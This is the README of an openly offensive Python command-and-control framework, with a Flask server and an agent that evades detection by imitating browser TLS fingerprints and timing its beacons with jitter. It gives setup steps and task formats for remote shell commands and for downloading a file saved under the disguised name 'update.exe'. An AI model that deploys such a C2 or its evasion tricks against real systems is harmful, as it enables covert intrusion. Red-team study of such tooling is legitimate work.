
# Simple Python C2 Framework

A lightweight Command & Control (C2) framework written in Python. It consists of a Flask-based server and a client-side agent that utilizes TLS fingerprint impersonation to evade detection.

## Features

-   **Encrypted Communication:** All traffic between the Agent and C2 is encrypted using Fernet (AES).
    
-   **TLS Impersonation:** The agent uses `curl_cffi` to mimic real browser fingerprints (Chrome/Safari) to blend in with normal traffic.
    
-   **Dynamic Sleep:** The agent alters its beacon intervals based on the time of day (Work hours vs. Nights/Weekends) with random jitter.
    
-   **Tasking System:** Supports Shell execution, File downloads, and Sleep configuration updates.
    
-   **Persistence:** The agent generates and saves a unique ID to maintain identity across restarts.


## Project Structure
```
.
├── C2.py       # The C2 Server (Flask)
├── Agent.py        # The Client Agent
├── Encryption.py   # Shared encryption logic
├── .env            # Environment file for keys
└── tasks.json      # (Auto-generated) Stores pending tasks
└── agents.json     # (Auto-generated) Stores agent info
```

## Prerequisites

You need Python 3.8+ and the following libraries:

```
pip install flask curl-cffi cryptography python-dotenv request
```

## Setup & Configuration

### 1. Generate Encryption Key

You must generate a Fernet key and save it in a `.env` file. Both the Server and the Agent need access to this logic/key to communicate.

Run this in Python to get a key:
```
from cryptography.fernet import Fernet
print(Fernet.generate_key().decode())
```

Create a `.env` file in the root directory:


```
FERNET_KEY=YOUR_GENERATED_KEY_HERE
```

### 2. Configure the Agent

Open `agent.py` and modify the `SERVER` variable if you are not running locally:
```
SERVER = 'http://127.0.0.1:5000' 
# Change to your C2 IP/Domain
```

## Usage

### 1. Start the Server
```
python server.py
```
The server will listen on `0.0.0.0:5000`.

### 2. Start the Agent


```
python agent.py
```

The agent will register with the server and begin beaconing based on the sleep intervals.

### 3. Queueing Tasks (How to Control Agents)

Currently, tasks are pushed via the `/api/push_task` endpoint. You can use `curl` or Postman to queue a command.

**Example: Encrypt your task payload first**

_Note: Since the server expects encrypted JSON, you need a small helper script to encrypt your command before sending it via curl, or extend the server to accept plain text from an admin interface._

**Task Types:**

1.  **Shell Command:**
 `{"type": "shell", "command": "whoami"}`
    
2.  **Download:** 
`{"type": "download", "url": "http://site.com/file.exe", "save_as": "update.exe"}`
    
3.  **Sleep Update:**
 `{"type": "sleep", "min": 5, "max": 10}`
    

## Disclaimer
This project is for **educational purposes and security research only**. Usage of this code for attacking targets without prior mutual consent is illegal. The developer assumes no liability and is not responsible for any misuse or damage caused by this program.
